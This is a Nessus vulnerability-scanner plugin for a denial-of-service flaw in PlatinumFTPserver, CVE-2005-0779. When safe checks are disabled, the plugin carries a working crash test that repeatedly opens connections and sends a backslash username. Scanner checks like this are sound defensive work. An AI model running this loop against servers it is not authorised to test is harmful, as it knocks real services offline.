#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote FTP server is susceptible to a denial of service attack. 

Description :

The installed version of PlatinumFTPserver on the remote host suffers
from a denial of service vulnerability.  Specifically, when a user
tries to login with a username containing a backslash, '\', the
application displays a dialog box and stops the login process until an
administrator acknowledges a message.  After several such connection
attempts, the ftp server daemon reportedly crashes. 

See also : 

http://www.securityfocus.com/archive/1/393038

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:N)";


if (description) {
  script_id(17321);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-0779");
  script_bugtraq_id(12790);

  name["english"] = "PlatinumFTPServer Multiple Malformed User Name Connection Denial Of Service Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple malformed username connection denial of service vulnerability in PlatinumFTPServer";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("ftpserver_detect_type_nd_version.nasl");
  script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# Get the banner and make sure it looks like an FTP server.
banner = get_ftp_banner(port:port);
if (
  !banner || 
  !egrep(string:banner, pattern:"^220[ -]") ||
  "Platinum" >!< banner
) exit(0);


# Check for vulnerability.
if (safe_checks()) {
  # According to the advisory, version 1.0.18 and maybe lower are affected.
  #
  # nb: PlatinumFTPserver allows the admin to change the banner.
  if (egrep(string:banner, pattern:"^220-PlatinumFTPserver V(0\..*|1\.0\.([1-9]|1[0-8]))[^0-9.]")) {
    report = string(
      desc["english"],
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus has determined the vulnerability exists on the target simply\n",
      "by looking at the version number of PlatinumFTPserver installed\n",
      "there.\n"
    );
    security_note(port:port, data:report);
  }
}
else {
  # Try up to 50 times to log in.
  max = 50;
  for (i=1; i<=max; i++) {
    soc = open_sock_tcp(port);
    if (soc) {
      # Keep track of socket for later.
      sockets[i] = soc;
      req = string("USER \\\r\n");
      send(socket:soc, data:req);
    }
    # If we can't open the socket, there's a problem.
    else {
      security_note(port);
      exit(0);
    }
    # nb: prevents false positives.
    sleep(1);
  }
  # Release any opened sockets.
  for (i=1; i<=max; i++) {
    if (sockets[i]) close(sockets[i]);
  }
}
